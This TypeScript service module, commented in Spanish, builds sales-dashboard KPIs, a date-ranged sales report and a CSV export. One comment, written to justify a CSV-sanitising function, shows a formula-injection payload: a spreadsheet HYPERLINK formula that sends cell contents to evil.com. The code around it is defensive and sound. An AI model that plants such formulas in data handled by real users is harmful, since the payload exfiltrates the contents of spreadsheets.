// KPIs del dashboard (ventas de hoy/mes, productos con stock bajo, top 5
// productos) y el reporte de ventas por rango de fechas (exportable a CSV).
// Todo de solo lectura — este módulo nunca modifica datos, solo los agrega.
import { InvoiceStatus, Prisma, Role } from "@prisma/client";
import { prisma } from "../../config/prisma";
import {
  startOfBusinessToday,
  startOfBusinessMonth,
  startOfBusinessLocalDay,
  formatBusinessDateTime
} from "../../utils/businessDate";
import { SalesReportQuery } from "./dashboard.schemas";

interface RequestingUser {
  id: string;
  role: Role;
}

// El negocio opera en hora de Guatemala (UTC-6, sin horario de verano), pero
// el servidor (Railway) corre en UTC — ver utils/businessDate.ts para el
// razonamiento completo. invoices.service.ts usa el mismo helper para su
// propio filtro de fechas, así que la lógica vive en un solo lugar.
const startOfToday = startOfBusinessToday;
const startOfMonth = startOfBusinessMonth;
const startOfLocalDay = startOfBusinessLocalDay;

// Misma regla de scoping que invoices.service.ts: un VENDEDOR solo ve sus
// propias ventas en el dashboard; un ADMIN ve las de todos (objeto de
// filtro vacío = sin restricción adicional).
function userScopeWhere(requester: RequestingUser): Prisma.InvoiceWhereInput {
  return requester.role === Role.VENDEDOR ? { userId: requester.id } : {};
}

// Arma todos los KPIs de la pantalla principal del dashboard en un solo
// viaje: ventas de hoy, ventas del mes, cantidad de facturas del mes,
// productos con stock bajo, y los 5 productos más vendidos. Las 5 queries
// corren en paralelo (Promise.all) porque son independientes entre sí — no
// hay razón para esperarlas una por una.
export async function getSummary(requester: RequestingUser) {
  const scope = userScopeWhere(requester);

  const [salesTodayAgg, salesMonthAgg, invoiceCountMonth, lowStockProducts, topProductsRaw] = await Promise.all([
    prisma.invoice.aggregate({
      where: { ...scope, status: InvoiceStatus.EMITIDA, createdAt: { gte: startOfToday() } },
      _sum: { total: true }
    }),
    prisma.invoice.aggregate({
      where: { ...scope, status: InvoiceStatus.EMITIDA, createdAt: { gte: startOfMonth() } },
      _sum: { total: true }
    }),
    prisma.invoice.count({
      where: { ...scope, status: InvoiceStatus.EMITIDA, createdAt: { gte: startOfMonth() } }
    }),
    // Prisma no permite comparar dos columnas de la misma fila directamente
    // en un `where` (`stock <= minStock`) con su API normal, así que se
    // resuelve con SQL crudo para obtener los ids, y luego una consulta
    // normal de Prisma (con su `include`/tipado) para traer los productos
    // completos con esos ids.
    prisma.$queryRaw<Array<{ id: string }>>`
      SELECT id FROM "Product" WHERE active = true AND stock <= "minStock" ORDER BY stock ASC LIMIT 100
    `.then(async (rows) => {
      const ids = rows.map((r) => r.id);
      if (ids.length === 0) return [];
      return prisma.product.findMany({ where: { id: { in: ids } }, orderBy: { stock: "asc" } });
    }),
    // Suma cantidades y montos vendidos por producto, agrupando todas las
    // líneas de factura (`InvoiceItem`) de todas las facturas emitidas, y se
    // queda con los 5 productos con más unidades vendidas.
    prisma.invoiceItem.groupBy({
      by: ["productId"],
      where: { invoice: { ...scope, status: InvoiceStatus.EMITIDA } },
      _sum: { quantity: true, subtotal: true },
      orderBy: { _sum: { quantity: "desc" } },
      take: 5
    })
  ]);

  // `groupBy` solo devuelve el productId y los agregados, no el resto de
  // datos del producto (nombre, sku) — se hace una segunda consulta para
  // completarlos y se unen en memoria con un Map.
  const productIds = topProductsRaw.map((t) => t.productId);
  const products = await prisma.product.findMany({ where: { id: { in: productIds } } });
  const productsById = new Map(products.map((p) => [p.id, p]));

  const topProducts = topProductsRaw
    .map((t) => {
      const product = productsById.get(t.productId);
      if (!product) return null;
      return {
        productId: product.id,
        name: product.name,
        sku: product.sku,
        quantitySold: t._sum.quantity ?? 0,
        totalSold: t._sum.subtotal ?? new Prisma.Decimal(0)
      };
    })
    .filter((t): t is NonNullable<typeof t> => t !== null);

  return {
    salesToday: salesTodayAgg._sum.total ?? new Prisma.Decimal(0),
    salesMonth: salesMonthAgg._sum.total ?? new Prisma.Decimal(0),
    invoiceCountMonth,
    lowStockProducts,
    topProducts
  };
}

// Ventana por defecto cuando no se manda "from": sin esto, pedir el reporte
// sin fechas (el único endpoint de listado del backend sin paginar) trae
// TODAS las facturas no anuladas de toda la historia con sus items
// incluidos, en una sola respuesta. Quien de verdad quiera un rango más
// amplio lo pide explícito con "from" — esto solo acota el caso "no mandé
// nada".
const DEFAULT_REPORT_WINDOW_DAYS = 90;
const ONE_DAY_MS = 24 * 60 * 60 * 1000;

// Detalle de ventas en un rango de fechas, usado tanto para la gráfica
// "últimos 14 días" del dashboard como para el reporte exportable a CSV.
export async function getSalesReport(query: SalesReportQuery, requester: RequestingUser) {
  const where: Prisma.InvoiceWhereInput = { ...userScopeWhere(requester), status: InvoiceStatus.EMITIDA };

  // "from"/"to" llegan como fechas de calendario ("YYYY-MM-DD") sin hora.
  // new Date("YYYY-MM-DD") las interpreta como medianoche UTC, no medianoche
  // local, lo que corta ventas del día (sobre todo las de la tarde/noche) en
  // cualquier zona horaria detrás de UTC. Se parsean como fecha local, igual
  // que startOfToday()/startOfMonth() más arriba, y el límite superior es
  // exclusivo al día siguiente para incluir el día completo.
  const upperBound = query.to ? startOfLocalDay(query.to, 1) : new Date(startOfToday().getTime() + ONE_DAY_MS);
  const lowerBound = query.from
    ? startOfLocalDay(query.from)
    : new Date(upperBound.getTime() - DEFAULT_REPORT_WINDOW_DAYS * ONE_DAY_MS);

  where.createdAt = { gte: lowerBound, lt: upperBound };

  const invoices = await prisma.invoice.findMany({
    where,
    include: { client: true, items: true },
    orderBy: { createdAt: "asc" }
  });

  return invoices.map((inv) => ({
    number: inv.number,
    date: inv.createdAt,
    client: inv.client.name,
    itemCount: inv.items.length,
    subtotal: inv.subtotal,
    tax: inv.tax,
    total: inv.total
  }));
}

// Excel/Sheets interpretan una celda que empieza con =, +, -, @ o un tab
// como el inicio de una fórmula, no como texto. `client` viene de
// Client.name, que cualquier usuario autenticado controla al crear un
// cliente (no requiere ser ADMIN) — sin este chequeo, un cliente con nombre
// `=HYPERLINK("http://evil.com?d="&A1,"ver")` se convierte en un link vivo
// (o peor) en la computadora del ADMIN que abra el reporte exportado. Un
// apóstrofe al inicio le dice a la hoja de cálculo "esto es texto", sin
// cambiar cómo se ve el valor para un humano.
function sanitizeCsvCell(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

// Convierte filas de getSalesReport a texto CSV, escapando comillas dobles
// y envolviendo cada valor entre comillas (así una coma dentro de un nombre
// de cliente no rompe las columnas). Usado por el endpoint
// /dashboard/sales-report cuando se pide `?format=csv`.
export function toCsv(rows: Array<Record<string, unknown>>): string {
  if (rows.length === 0) return "number,date,client,itemCount,subtotal,tax,total\n";
  const headers = Object.keys(rows[0]);
  const lines = [headers.join(",")];
  for (const row of rows) {
    lines.push(
      headers
        .map((h) => {
          const value = row[h];
          // Hora de Guatemala, no toISOString() (UTC): el reporte ya filtra
          // por día de negocio en Guatemala (startOfBusinessLocalDay), así
          // que imprimir la fecha en UTC podía mostrar un día de calendario
          // distinto al que efectivamente se filtró.
          const str = value instanceof Date ? formatBusinessDateTime(value) : sanitizeCsvCell(String(value));
          return `"${str.replace(/"/g, '""')}"`;
        })
        .join(",")
    );
  }
  return lines.join("\n");
}
